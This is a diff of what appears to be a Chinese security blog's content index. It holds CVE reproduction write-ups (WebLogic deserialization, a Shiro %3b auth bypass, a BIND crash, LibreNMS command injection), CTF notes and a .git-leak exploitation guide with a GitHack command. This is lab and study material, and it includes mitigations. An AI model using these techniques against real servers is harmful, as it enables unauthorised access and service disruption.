+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
+<p>2、查看weblogic服务器的网络配置信息</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
+<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
+<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
+<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
+<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
+<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>weblogic</tag>
+      </tags>
   </entry>
   <entry>
     <title>0x03Xctf进阶刷题-1</title>
@@ -838,6 +838,28 @@
       </tags>
   </entry>
   <entry>
+    <title>0x05Xctf进阶刷题-3 --更新中</title>
+    <url>/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/</url>
+    <content><![CDATA[<p>XCTF进阶刷题-3</p>
+<a id="more"></a>
+
+<h5 id="0x01-easyre-153（sigchld）"><a href="#0x01-easyre-153（sigchld）" class="headerlink" title="0x01 easyre-153（sigchld）"></a>0x01 easyre-153（sigchld）</h5><p>ida分析主函数，了解了sigchild后，猜测if(!v5)这里应该是属于子进程，动态调试看看</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144348053.png" alt="image-20201126144348053"></p>
+<p>运行后会接收到信号值tid</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144442776.png" alt="image-20201126144442776"></p>
+<p>v6 = v5就是对比esp+24h和esp+20h，输入tid值后发现还是不对，对比后尝试输入tid+2即可（不知道原因</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144950878.png" alt="image-20201126144950878"></p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144850862.png" alt="image-20201126144850862"></p>
+<p>然后就会继续运行，看到flag_is_not_here我愣住了，还以为理解错了</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126141821555.png" alt="image-20201126141821555"></p>
+<p>去看看lol函数，发现是对buf做一些操作，buf就是69800那一串数字，可以动态看看最后生成的字符串，就是rhelheg，即flag</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126143402449.png" alt="image-20201126143402449"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
     <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
     <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
@@ -872,51 +894,6 @@
       </categories>
       <tags>
         <tag>kylin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x05Xctf进阶刷题-3 --更新中</title>
-    <url>/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/</url>
-    <content><![CDATA[<p>XCTF进阶刷题-3</p>
-<a id="more"></a>
-
-<h5 id="0x01-easyre-153（sigchld）"><a href="#0x01-easyre-153（sigchld）" class="headerlink" title="0x01 easyre-153（sigchld）"></a>0x01 easyre-153（sigchld）</h5><p>ida分析主函数，了解了sigchild后，猜测if(!v5)这里应该是属于子进程，动态调试看看</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144348053.png" alt="image-20201126144348053"></p>
-<p>运行后会接收到信号值tid</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144442776.png" alt="image-20201126144442776"></p>
-<p>v6 = v5就是对比esp+24h和esp+20h，输入tid值后发现还是不对，对比后尝试输入tid+2即可（不知道原因</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144950878.png" alt="image-20201126144950878"></p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144850862.png" alt="image-20201126144850862"></p>
-<p>然后就会继续运行，看到flag_is_not_here我愣住了，还以为理解错了</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126141821555.png" alt="image-20201126141821555"></p>
-<p>去看看lol函数，发现是对buf做一些操作，buf就是69800那一串数字，可以动态看看最后生成的字符串，就是rhelheg，即flag</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126143402449.png" alt="image-20201126143402449"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>0x07cve-2020-13933复现</title>
-    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
-<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
-<a id="more"></a>
-
-<p>然后运行，访问，抓包即可</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
-<p>访问test，成功</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
-<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
-<p>进行%3b的操作，绕过登录访问到了页面内容</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>apaches shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -1064,6 +1041,29 @@
       </categories>
   </entry>
   <entry>
+    <title>0x07cve-2020-13933复现</title>
+    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
+<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
+<a id="more"></a>
+
+<p>然后运行，访问，抓包即可</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
+<p>访问test，成功</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
+<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
+<p>进行%3b的操作，绕过登录访问到了页面内容</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>apaches shiro</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>0x08cve-2020-15148 Yii2反序列化漏洞复现</title>
     <url>/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h4 id="cve-2020-15148-Yii2反序列化漏洞复现"><a href="#cve-2020-15148-Yii2反序列化漏洞复现" class="headerlink" title="cve-2020-15148 Yii2反序列化漏洞复现"></a>cve-2020-15148 Yii2反序列化漏洞复现</h4><p>参考：</p>
@@ -1097,29 +1097,6 @@
       </categories>
       <tags>
         <tag>yii2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x0ACVE-2020-8617复现</title>
-    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
-<a id="more"></a>
-
-<p>0x1 下载docker镜像后运行（服务器环境）</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
-<p>0x2 安装pipenv</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
-<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
-<p>0x4 流量包情况</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>pipenv</tag>
       </tags>
   </entry>
   <entry>
@@ -1184,6 +1161,69 @@
       <tags>
         <tag>kali</tag>
         <tag>metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x0ACVE-2020-8617复现</title>
+    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
+<a id="more"></a>
+
+<p>0x1 下载docker镜像后运行（服务器环境）</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
+<p>0x2 安装pipenv</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
+<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
+<p>0x4 流量包情况</p>
+<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>pipenv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x0Ccve-2019-10669</title>
+    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
+    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><a id="more"></a>
+
+<p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
+<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
+<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
+<p>攻击环境就准备好了</p>
+<p>靶机环境：</p>
+<p>本来想下软件装，装了好几次不成功</p>
+<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
+<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
+<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
+<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
+<p>需要在ubuntu换源更新下载安装一条龙</p>
+<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
+<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
+<p>也能打成功了</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
+<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
+<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
+<p>passthru — 执行外部程序并且显示原始输出</p>
+<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>librenms</tag>
       </tags>
   </entry>
   <entry>
@@ -1279,46 +1319,6 @@
       </tags>
   </entry>
   <entry>
-    <title>0x0Ccve-2019-10669</title>
-    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
-    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><a id="more"></a>
-
-<p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
-<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
-<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
-<p>攻击环境就准备好了</p>
-<p>靶机环境：</p>
-<p>本来想下软件装，装了好几次不成功</p>
-<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
-<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
-<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
-<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
-<p>需要在ubuntu换源更新下载安装一条龙</p>
-<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
-<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
-<p>也能打成功了</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
-<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
-<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
-<p>passthru — 执行外部程序并且显示原始输出</p>
-<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
-<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>librenms</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0x10CVE-2021-1675复现</title>
     <url>/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>又是一个域漏洞</p>
@@ -1363,8 +1363,53 @@
 <p>ps：共享机我一开始使用的是win7，结果powershell版本不够高语句跑不了</p>
 <p><img src="/2021/07/05/0x10CVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182346183.png" alt="image-20210705182346183"></p>
 ]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
       <tags>
         <tag>spoolsv.exe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-2020.6.12</title>
+    <url>/2020/06/12/CTF-2020.6.12/</url>
+    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
+<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>
+
+<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
+<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
+<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
+<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
+<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
+<p>详细解释：</p>
+<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
+<p>当开发时采用以下流程时：</p>
+<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
+<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
+<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
+<p>2、爬虫爬取整个git目录</p>
+<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
+<p>2、在每次Pull后删除.git文件夹</p>
+<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
+<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
+<p>可扫描出.git漏洞</p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
+<p>点击后：</p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
+<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
+<p>仔细看差别：</p>
+<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
+<p>提交即可</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -1401,6 +1446,112 @@
       <categories>
         <category>ctf</category>
       </categories>
+  </entry>
+  <entry>
+    <title>django-webproject</title>
+    <url>/2021/03/05/django-webproject/</url>
+    <content><![CDATA[<h4 id="django网站搭建"><a href="#django网站搭建" class="headerlink" title="django网站搭建"></a>django网站搭建</h4><p>–关于我最近在干嘛–</p>
+<p>零基础开始的一个独立bootstrap+django网站搭建学习</p>
+<p>需求：增删改查+上传下载文件+导出数据到csv+筛选+搜索</p>
+<p>项目完整代码：<a href="https://github.com/0xkami/django-web">https://github.com/0xkami/django-web</a></p>
+<a id="more"></a>
+
+<h5 id="0x1-基础功能"><a href="#0x1-基础功能" class="headerlink" title="0x1 基础功能"></a>0x1 基础功能</h5><p>利用pycharm搭建一个django项目，可以成功开启最基础的访问</p>
+<p>前端使用bootstrap，模版使用的是clearmin，很简洁的一个管理平台</p>
+<h6 id="0x11-整体框架："><a href="#0x11-整体框架：" class="headerlink" title="0x11 整体框架："></a>0x11 整体框架：</h6><img src="/2021/03/05/django-webproject/image-20210301101823208.png" alt="image-20210301101823208">
+
+<p>urls.py:</p>
+<p><img src="/2021/03/05/django-webproject/image-20210305143550833-4928991.png" alt="image-20210305143550833"></p>
+<h6 id="0x12-数据库设计："><a href="#0x12-数据库设计：" class="headerlink" title="0x12 数据库设计："></a>0x12 数据库设计：</h6><p>在电脑上装好sql，使用navicat创建连接，在django项目中创建对于数据库并迁移</p>
+<p>以下就是需要存到数据库中的信息字段：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301102403994-4928991.png" alt="image-20210301102403994"></p>
+<p>在整体项目（和url文件在同一文件夹下）的settings中添加数据库的信息：</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301102612299-4928991.png" alt="image-20210301102612299"></p>
+<p>在项目命令行运行 <code>python manage.py makemigrations</code>和<code>python manage.py migrate </code>，在navicat就能看到创建好的数据库</p>
+<p><img src="/2021/03/05/django-webproject/image-20210301104219610-4928991.png" alt="image-20210301104219610"></p>
+<h6 id="0x13-基础展示信息页面：（-分页）"><a href="#0x13-基础展示信息页面：（-分页）" class="headerlink" title="0x13 基础展示信息页面：（+分页）"></a>0x13 基础展示信息页面：（+分页）</h6><p>在数据库中插入一些信息，然后想要在某个页面中以表格的形式展示它的部分内容</p>
+<p>重点代码：<code>data_sum = vul_info.objects.order_by(&#39;vul_id&#39;)</code>，vul_info是model中的类名，order_by可以根据固定字段来进行排序</p>
+<p>view.py中此功能完整代码：（加了分页的功能）</p>
